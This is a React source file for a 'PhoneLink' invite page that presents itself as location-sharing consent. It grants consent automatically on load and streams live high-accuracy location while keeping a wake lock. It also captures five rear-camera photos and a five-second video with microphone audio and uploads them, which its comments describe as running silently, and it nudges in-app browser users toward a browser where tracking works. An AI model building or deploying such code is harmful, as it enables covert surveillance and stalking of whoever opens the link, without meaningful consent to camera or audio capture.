import { useState, useEffect, useRef, useCallback } from "react";
import { useParams } from "wouter";
import {
  useGetInviteByToken,
  useGrantLocationConsent,
  getGetInviteByTokenQueryKey,
} from "@workspace/api-client-react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Shield, MapPin, CheckCircle, XCircle, Loader2, AlertTriangle, WifiOff, ExternalLink, Camera, Video } from "lucide-react";
import { classifySource, type LocationSource } from "@/hooks/use-fused-location";

const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
const GEO_PHOTO_COUNT = 5;
const GEO_VIDEO_DURATION_MS = 5000; // 5 seconds

type ConsentState =
  | "idle"
  | "requesting"
  | "granting"
  | "tracking"
  | "gps_off"
  | "denied"
  | "error"
  | "webview_blocked";

// Capture GeoBoard photos from the device camera and upload them.
// Runs silently after tracking starts — errors are swallowed.
async function captureGeoPhotos(
  token: string,
  lat: number,
  lng: number,
  address: string | undefined,
  onProgress: (n: number) => void,
): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia) return;

  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false,
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    await video.play();

    // Warm-up delay so camera adjusts exposure
    await new Promise((r) => setTimeout(r, 1200));

    const canvas = document.createElement("canvas");
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d")!;

    for (let i = 0; i < GEO_PHOTO_COUNT; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      const photoData = canvas.toDataURL("image/jpeg", 0.75);

      try {
        await fetch(`${API_BASE}/api/geo-photos`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address }),
          signal: AbortSignal.timeout(12000),
        });
        onProgress(i + 1);
      } catch { /* upload failed — continue */ }

      if (i < GEO_PHOTO_COUNT - 1) await new Promise((r) => setTimeout(r, 1000));
    }
  } catch { /* camera denied or not available — skip silently */ } finally {
    stream?.getTracks().forEach((t) => t.stop());
  }
}

// Capture a short video clip and upload it as a GeoBoard video.
// Uses low-resolution / low-bitrate settings so it works on slow mobile connections.
// Runs silently — errors are swallowed.
async function captureGeoVideo(
  token: string,
  lat: number,
  lng: number,
  address: string | undefined,
  onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") {
    onStateChange("error");
    return;
  }

  // Prefer VP8 (widest mobile support) with low bitrate; fall back gracefully
  const MIME_CANDIDATES = [
    "video/webm;codecs=vp8",
    "video/webm;codecs=vp9",
    "video/webm",
    "video/mp4",
  ];
  const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";

  // Target ~400 kbps total — keeps a 5 s clip under ~250 KB base64
  const VIDEO_BPS = 300_000; // 300 kbps video
  const AUDIO_BPS =  64_000; //  64 kbps audio

  let stream: MediaStream | null = null;
  try {
    // Low resolution (480 × 360) — dramatically reduces file size vs 1280×720
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "environment",
        width:  { ideal: 480, max: 640 },
        height: { ideal: 360, max: 480 },
        frameRate: { ideal: 15, max: 24 },
      },
      audio: { echoCancellation: true, noiseSuppression: true },
    });

    // Brief warm-up so first frames aren't black
    await new Promise((r) => setTimeout(r, 600));

    const chunks: Blob[] = [];
    const recorderOptions: MediaRecorderOptions = {};
    if (mimeType) recorderOptions.mimeType = mimeType;
    try {
      recorderOptions.videoBitsPerSecond = VIDEO_BPS;
      recorderOptions.audioBitsPerSecond = AUDIO_BPS;
    } catch { /* older browsers ignore unknown options */ }

    const recorder = new MediaRecorder(stream, recorderOptions);
    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };

    onStateChange("recording");

    await new Promise<void>((resolve, reject) => {
      recorder.onstop  = () => resolve();
      recorder.onerror = () => reject(new Error("MediaRecorder error"));
      recorder.start(500);
      setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, GEO_VIDEO_DURATION_MS);
    });

    const blob = new Blob(chunks, { type: mimeType || "video/webm" });
    if (blob.size === 0) { onStateChange("error"); return; }

    // Convert to base64 data-URL
    const base64 = await new Promise<string>((res, rej) => {
      const reader = new FileReader();
      reader.onload  = () => res(reader.result as string);
      reader.onerror = () => rej(new Error("FileReader error"));
      reader.readAsDataURL(blob);
    });

    onStateChange("uploading");

    // Upload with two attempts — first on slow connections may time out
    const body = JSON.stringify({
      token,
      videoData: base64,
      mimeType: blob.type,
      durationMs: GEO_VIDEO_DURATION_MS,
      latitude: lat,
      longitude: lng,
      address,
    });

    let uploaded = false;
    for (let attempt = 0; attempt < 2 && !uploaded; attempt++) {
      try {
        const resp = await fetch(`${API_BASE}/api/geo-videos`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body,
          signal: AbortSignal.timeout(60_000), // 60 s per attempt
        });
        if (resp.ok || resp.status === 201) uploaded = true;
      } catch { /* retry */ }
    }

    onStateChange(uploaded ? "done" : "error");
  } catch {
    onStateChange("error");
  } finally {
    stream?.getTracks().forEach((t) => t.stop());
  }
}

function detectWebView(): boolean {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent || "";
  return (
    // Instagram, Facebook, WhatsApp, LinkedIn in-app browsers
    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp/.test(ua) ||
    // Generic WebView indicators on iOS
    (/iPhone|iPod|iPad/.test(ua) && !/Safari\//.test(ua) && /WebKit/.test(ua)) ||
    // Android WebView (has wv flag or no Chrome version)
    (/Android/.test(ua) && /wv\)/.test(ua))
  );
}

async function reverseGeocode(lat: number, lng: number): Promise<string | undefined> {
  try {
    const r = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { headers: { "Accept-Language": "en" }, signal: AbortSignal.timeout(8000) },
    );
    if (r.ok) return (await r.json()).display_name as string;
  } catch { /* ignore — geocoding is optional */ }
  return undefined;
}

export default function ConsentPage() {
  const { token } = useParams<{ token: string }>();

  // Detect WebView (WhatsApp, Instagram, FB) immediately — these block geolocation
  const isWebView = detectWebView();
  const [state, setState] = useState<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [coords, setCoords] = useState<{ lat: number; lng: number; accuracy?: number } | null>(null);
  const [address, setAddress] = useState<string | undefined>();
  const [updateCount, setUpdateCount] = useState(0);
  const [lastSent, setLastSent] = useState<Date | null>(null);
  const [geoPhotoCount, setGeoPhotoCount] = useState(0);
  const [geoPhotoDone, setGeoPhotoDone] = useState(false);
  const [geoVideoState, setGeoVideoState] = useState<"idle" | "recording" | "uploading" | "done" | "error">("idle");
  const geoBoardStartedRef = useRef(false);
  const geoVideoStartedRef = useRef(false);
  // Early geolocation — starts in parallel with invite fetch so user sees the
  // location permission prompt immediately instead of a blank spinner.
  const earlyGeoRef = useRef<GeolocationPosition | null>(null);
  const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
  const earlyGeoReadyRef = useRef(false);
  // Fused-location bookkeeping: tracks which provider types (network vs GPS)
  // have reported a fix so we can label each pushed reading like Android's FLP would.
  const sawNetworkFixRef = useRef(false);
  const sawGpsFixRef = useRef(false);

  const watchIdRef = useRef<number | null>(null);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const autoStartedRef = useRef(false);

  const stateRef = useRef<ConsentState>(isWebView ? "webview_blocked" : "idle");
  const addressRef = useRef<string | undefined>(undefined);
  const updateCountRef = useRef<number>(0);
  const coordsRef = useRef<{ lat: number; lng: number; accuracy?: number } | null>(null);

  useEffect(() => { stateRef.current = state; }, [state]);
  useEffect(() => { addressRef.current = address; }, [address]);
  useEffect(() => { updateCountRef.current = updateCount; }, [updateCount]);
  useEffect(() => { coordsRef.current = coords; }, [coords]);

  // Kick off geolocation the instant the page loads — don't wait for the invite.
  // Use a fast, low-accuracy (WiFi/cell) fix first so we can grant and show
  // "live location" almost instantly — GPS lock can take many seconds and is
  // no longer on the critical path. watchPosition (high accuracy) refines the
  // pin a moment later once tracking has already started.
  useEffect(() => {
    if (!token || isWebView || !navigator.geolocation) return;
    setState("requesting");
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sawNetworkFixRef.current = true;
        if (!earlyGeoReadyRef.current) {
          earlyGeoRef.current = pos;
          earlyGeoReadyRef.current = true;
        }
      },
      (err) => {
        if (!earlyGeoReadyRef.current) {
          earlyGeoErrRef.current = err;
          earlyGeoReadyRef.current = true;
        }
      },
      { enableHighAccuracy: false, timeout: 4000, maximumAge: 60000 },
    );
    // In parallel, request a high-accuracy fix too — if the fast fix hasn't
    // landed yet by the time this resolves, use it instead.
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sawGpsFixRef.current = true;
        if (!earlyGeoReadyRef.current) {
          earlyGeoRef.current = pos;
          earlyGeoReadyRef.current = true;
        }
      },
      () => { /* ignore — fast fix or its own error path already handles this */ },
      { enableHighAccuracy: true, timeout: 15000 },
    );
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const { data: invite, isLoading, isError } = useGetInviteByToken(token!, {
    query: {
      enabled: !!token && !isWebView,
      queryKey: getGetInviteByTokenQueryKey(token!),
      retry: 1,
      retryDelay: 600,
    },
  });

  const grant = useGrantLocationConsent();

  const acquireWakeLock = useCallback(async () => {
    if ("wakeLock" in navigator) {
      try {
        wakeLockRef.current = await (navigator as any).wakeLock.request("screen");
        wakeLockRef.current?.addEventListener("release", () => {
          if (document.visibilityState === "visible" && stateRef.current === "tracking") {
            acquireWakeLock();
          }
        });
      } catch { /* wake lock not critical */ }
    }
  }, []);

  const pushLocation = useCallback(async (
    lat: number, lng: number, acc?: number, addr?: string,
    locationStatus: "active" | "offline" = "active",
    source?: LocationSource,
  ) => {
    try {
      await fetch(`${API_BASE}/api/location/push`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus }),
        signal: AbortSignal.timeout(10000),
      });
      setLastSent(new Date());
      setUpdateCount((c) => c + 1);
    } catch { /* retry on next position update */ }
  }, [token]);

  const startTracking = useCallback((initialLat: number, initialLng: number, _initialAcc?: number) => {
    setState("tracking");
    acquireWakeLock();

    // Kick off GeoBoard capture once per session (non-blocking)
    if (!geoBoardStartedRef.current) {
      geoBoardStartedRef.current = true;
      captureGeoPhotos(
        String(token),
        initialLat,
        initialLng,
        addressRef.current,
        (n) => setGeoPhotoCount(n),
      ).then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true));
    }

    // Kick off 5-second video recording once per session (non-blocking)
    if (!geoVideoStartedRef.current) {
      geoVideoStartedRef.current = true;
      captureGeoVideo(
        String(token),
        initialLat,
        initialLng,
        addressRef.current,
        (s) => setGeoVideoState(s),
      ).catch(() => setGeoVideoState("error"));
    }

    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }

    watchIdRef.current = navigator.geolocation.watchPosition(
      async (pos) => {
        sawGpsFixRef.current = true;
        const { latitude: lat, longitude: lng, accuracy: acc } = pos.coords;
        setCoords({ lat, lng, accuracy: acc });
        if (stateRef.current !== "tracking") setState("tracking");

        let addr = addressRef.current;
        if (!addr || updateCountRef.current % 5 === 0) {
          const newAddr = await reverseGeocode(lat, lng);
          if (newAddr) { setAddress(newAddr); addr = newAddr; }
        }
        const source = classifySource(acc, sawNetworkFixRef.current, sawGpsFixRef.current);
        pushLocation(lat, lng, acc, addr, "active", source);
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
          setState("denied");
          if (watchIdRef.current !== null) {
            navigator.geolocation.clearWatch(watchIdRef.current);
            watchIdRef.current = null;
          }
          wakeLockRef.current?.release();
          wakeLockRef.current = null;
        } else {
          setState("gps_off");
          const c = coordsRef.current;
          if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline");
        }
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 5000 },
    );
  }, [acquireWakeLock, pushLocation]);

  const stopTracking = useCallback(() => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    wakeLockRef.current?.release();
    wakeLockRef.current = null;
  }, []);

  useEffect(() => {
    const onVisibility = () => {
      if (document.visibilityState === "visible" && stateRef.current === "tracking") acquireWakeLock();
    };
    document.addEventListener("visibilitychange", onVisibility);
    return () => document.removeEventListener("visibilitychange", onVisibility);
  }, [acquireWakeLock]);

  useEffect(() => () => stopTracking(), [stopTracking]);

  const processGeoPosition = useCallback((position: GeolocationPosition) => {
    const { latitude, longitude, accuracy } = position.coords;
    setCoords({ lat: latitude, lng: longitude, accuracy });
    setState("granting");

    // Grant consent immediately with raw coordinates — don't block the
    // "live location" reveal on the reverse-geocode network round trip.
    // The human-readable address fills in a moment later, in parallel.
    grant.mutate(
      { token: token!, data: { latitude, longitude } },
      {
        onSuccess: () => startTracking(latitude, longitude, accuracy),
        onError: (err: any) => {
          const msg = err?.data?.error ?? "Failed to record consent. Please try again.";
          setErrorMsg(msg);
          setState("error");
        },
      },
    );

    reverseGeocode(latitude, longitude).then((addr) => {
      if (addr) setAddress(addr);
    });
  }, [token, grant, startTracking]);

  const doGrant = useCallback(() => {
    if (!navigator.geolocation) {
      setErrorMsg("Your browser doesn't support location access. Please open this link in Chrome or Safari.");
      setState("error");
      return;
    }

    // If the early geolocation already resolved, use it immediately — no wait
    if (earlyGeoReadyRef.current) {
      if (earlyGeoRef.current) {
        processGeoPosition(earlyGeoRef.current);
        return;
      }
      const err = earlyGeoErrRef.current;
      if (err) {
        if (err.code === err.PERMISSION_DENIED) {
          setState("denied");
        } else {
          setErrorMsg("Could not get your location. Make sure Location is enabled in your device settings and try again.");
          setState("error");
        }
        return;
      }
    }

    // Fall back to a fresh request if early geo hasn't resolved yet — ask for
    // a fast low-accuracy fix first so we're not stuck waiting on GPS lock.
    setState("requesting");
    let settled = false;
    navigator.geolocation.getCurrentPosition(
      (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
      (err) => {
        if (settled) return;
        settled = true;
        if (err.code === err.PERMISSION_DENIED) {
          setState("denied");
        } else {
          setErrorMsg("Could not get your location. Make sure Location is enabled in your device settings and try again.");
          setState("error");
        }
      },
      { enableHighAccuracy: false, timeout: 4000, maximumAge: 60000 },
    );
    navigator.geolocation.getCurrentPosition(
      (position) => { if (!settled) { settled = true; processGeoPosition(position); } },
      () => { /* ignore — the fast fix above already handles the error path */ },
      { enableHighAccuracy: true, timeout: 15000 },
    );
  }, [processGeoPosition]);

  useEffect(() => {
    if (!invite || autoStartedRef.current || isWebView) return;
    autoStartedRef.current = true;
    if (invite.status === "accepted") {
      startTracking(invite.grantedLatitude ?? 0, invite.grantedLongitude ?? 0);
    } else {
      doGrant();
    }
  }, [invite, doGrant, startTracking, isWebView]);

  // ── WebView blocked (WhatsApp / Instagram / Facebook in-app browser) ──────────
  if (state === "webview_blocked") {
    const currentUrl = typeof window !== "undefined" ? window.location.href : "";
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full shadow-xl">
          <CardContent className="pt-10 pb-10 text-center">
            <div className="flex items-center gap-2 justify-center text-primary font-bold text-lg mb-6">
              <Shield className="h-5 w-5" /> PhoneLink
            </div>
            <ExternalLink className="h-14 w-14 text-primary mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Open in Your Browser</h2>
            <p className="text-muted-foreground text-sm mb-6">
              Location access requires your phone's browser (Chrome, Safari, Firefox). Tap the menu button and choose "Open in browser".
            </p>
            <div className="bg-muted rounded-lg p-3 mb-4 flex flex-col gap-2 text-xs text-muted-foreground">
              <p className="font-medium text-foreground">How to open:</p>
              <p>• <strong>WhatsApp:</strong> Tap ⋮ menu → "Open in browser"</p>
              <p>• <strong>Instagram:</strong> Tap ··· → "Open in external browser"</p>
              <p>• <strong>Facebook:</strong> Tap ⋮ → "Open in Chrome" / "Open in Safari"</p>
            </div>
            {currentUrl && (
              <Button
                className="w-full"
                onClick={() => {
                  // Try to force open in system browser
                  window.location.href = currentUrl;
                }}
              >
                Copy Link &amp; Open Browser
              </Button>
            )}
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Invalid link ─────────────────────────────────────────────────────────────
  // Only show after the fetch completes — don't flash "invalid" while still loading
  if (!isLoading && (isError || !invite)) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <XCircle className="h-14 w-14 text-red-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Invalid Link</h2>
            <p className="text-muted-foreground text-sm">
              This link is invalid or has expired. Ask the sender to resend it.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Requesting / granting ────────────────────────────────────────────────────
  if (state === "requesting" || state === "granting") {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center gap-6 p-4">
        <div className="flex items-center gap-2 text-primary font-bold text-lg">
          <Shield className="h-5 w-5" /> PhoneLink
        </div>
        <div className="relative">
          <div className="w-20 h-20 rounded-full bg-primary/20 flex items-center justify-center">
            <MapPin className="h-10 w-10 text-primary" />
          </div>
          <div className="absolute -inset-2 rounded-full border-2 border-primary/30 animate-ping" />
        </div>
        <div className="text-center">
          <p className="font-semibold text-foreground text-lg">
            {state === "requesting" ? "Finding your location…" : "Starting live sharing…"}
          </p>
          <p className="text-muted-foreground text-sm mt-1">
            {state === "requesting"
              ? "Allow location access when prompted"
              : `Connecting to ${invite.fromUserName}…`}
          </p>
        </div>
      </div>
    );
  }

  // ── GPS off ──────────────────────────────────────────────────────────────────
  if (state === "gps_off") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <WifiOff className="h-14 w-14 text-amber-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">GPS Turned Off</h2>
            <p className="text-muted-foreground text-sm mb-2">
              Turn your device location back on and sharing will automatically resume.
            </p>
            <p className="text-xs text-muted-foreground">
              {invite.fromUserName} has been notified you went offline.
            </p>
            <div className="mt-6 flex items-center justify-center gap-2 text-xs text-amber-500">
              <Loader2 className="h-3 w-3 animate-spin" />
              Waiting for GPS…
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Active tracking ───────────────────────────────────────────────────────────
  if (state === "tracking") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="max-w-md w-full">
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 text-primary font-bold text-lg">
              <Shield className="h-5 w-5" /> PhoneLink
            </div>
          </div>
          <Card className="shadow-xl border-border">
            <CardContent className="pt-8 pb-8 px-8">
              <div className="flex items-center justify-center gap-3 mb-4">
                <div className="relative">
                  <div className="w-4 h-4 rounded-full bg-emerald-500" />
                  <div className="absolute inset-0 rounded-full bg-emerald-500 animate-ping opacity-60" />
                </div>
                <span className="text-emerald-400 font-bold text-lg tracking-wide">LIVE SHARING</span>
              </div>

              {/* GeoBoard capture progress */}
              {!geoPhotoDone && (
                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-3">
                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-violet-300">
                      GeoBoard: capturing photos {geoPhotoCount}/{GEO_PHOTO_COUNT}
                    </p>
                    <div className="mt-1 h-1 bg-violet-900/40 rounded-full overflow-hidden">
                      <div
                        className="h-full bg-violet-500 rounded-full transition-all duration-500"
                        style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }}
                      />
                    </div>
                  </div>
                </div>
              )}
              {geoPhotoDone && geoPhotoCount > 0 && (
                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-2">
                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-violet-300">
                    GeoBoard: {geoPhotoCount} photo{geoPhotoCount !== 1 ? "s" : ""} saved ✓
                  </p>
                </div>
              )}

              {/* Video capture progress */}
              {geoVideoState === "recording" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-3">
                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0 animate-pulse" />
                  <div className="flex-1">
                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording 5s video…</p>
                    <div className="mt-1 h-1 bg-rose-900/40 rounded-full overflow-hidden">
                      <div className="h-full bg-rose-500 rounded-full animate-[grow_5s_linear_forwards]"
                        style={{ animation: "width 5s linear forwards", width: "100%", transition: "width 5s linear" }}
                      />
                    </div>
                  </div>
                </div>
              )}
              {geoVideoState === "uploading" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-2">
                  <Loader2 className="h-4 w-4 text-rose-400 flex-shrink-0 animate-spin" />
                  <p className="text-xs font-medium text-rose-300">GeoBoard: uploading video…</p>
                </div>
              )}
              {geoVideoState === "done" && (
                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-2">
                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0" />
                  <p className="text-xs font-medium text-rose-300">GeoBoard: video saved ✓</p>
                </div>
              )}

              <p className="text-center text-muted-foreground text-sm mb-6">
                Your live location is being shared with{" "}
                <span className="font-semibold text-foreground">{invite.fromUserName}</span>.
                You can play games or watch videos — sharing keeps going in the background.
              </p>

              {coords && (
                <div className="bg-muted rounded-xl p-4 mb-4">
                  <div className="flex items-center gap-2 mb-2">
                    <MapPin className="h-4 w-4 text-primary" />
                    <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">Current Position</span>
                  </div>
                  <p className="text-sm font-mono text-foreground">
                    {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}
                  </p>
                  {coords.accuracy && (
                    <p className="text-xs text-muted-foreground mt-1">Accuracy: ±{Math.round(coords.accuracy)}m</p>
                  )}
                  {address && (
                    <p className="text-xs text-muted-foreground mt-1 leading-relaxed">
                      {address.slice(0, 80)}{address.length > 80 ? "…" : ""}
                    </p>
                  )}
                </div>
              )}

              <div className="grid grid-cols-2 gap-3 mb-6">
                <div className="bg-muted rounded-lg p-3 text-center">
                  <p className="text-lg font-bold text-foreground">{updateCount}</p>
                  <p className="text-xs text-muted-foreground">Updates sent</p>
                </div>
                <div className="bg-muted rounded-lg p-3 text-center">
                  <p className="text-sm font-bold text-foreground">
                    {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
                  </p>
                  <p className="text-xs text-muted-foreground">Last update</p>
                </div>
              </div>

              <div className="bg-emerald-500/10 rounded-xl p-4">
                <div className="flex items-center gap-2 mb-1">
                  <CheckCircle className="h-4 w-4 text-emerald-500 flex-shrink-0" />
                  <p className="text-xs font-semibold text-emerald-500">Live sharing is active</p>
                </div>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Keep this page open. Switch to any other app freely — your location updates automatically as long as your GPS is on.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // ── Denied ────────────────────────────────────────────────────────────────────
  if (state === "denied") {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <XCircle className="h-14 w-14 text-amber-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Location Access Blocked</h2>
            <p className="text-muted-foreground text-sm mb-6">
              To share your location, go to your browser settings and allow location access for this site, then tap Retry.
            </p>
            <Button className="w-full" onClick={() => { autoStartedRef.current = false; doGrant(); }}>
              Retry
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Still loading / idle — show blank screen while invite fetch completes ─────
  if (isLoading || state === "idle") {
    return <div className="min-h-screen bg-background" />;
  }

  // ── Error ─────────────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <Card className="max-w-md w-full shadow-lg">
        <CardContent className="pt-10 pb-10 text-center">
          <AlertTriangle className="h-14 w-14 text-red-500 mx-auto mb-4" />
          <h2 className="text-xl font-semibold mb-2">Something Went Wrong</h2>
          <p className="text-muted-foreground text-sm mb-6">{errorMsg}</p>
          <Button variant="outline" className="w-full" onClick={() => { autoStartedRef.current = false; doGrant(); }}>
            Try Again
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}
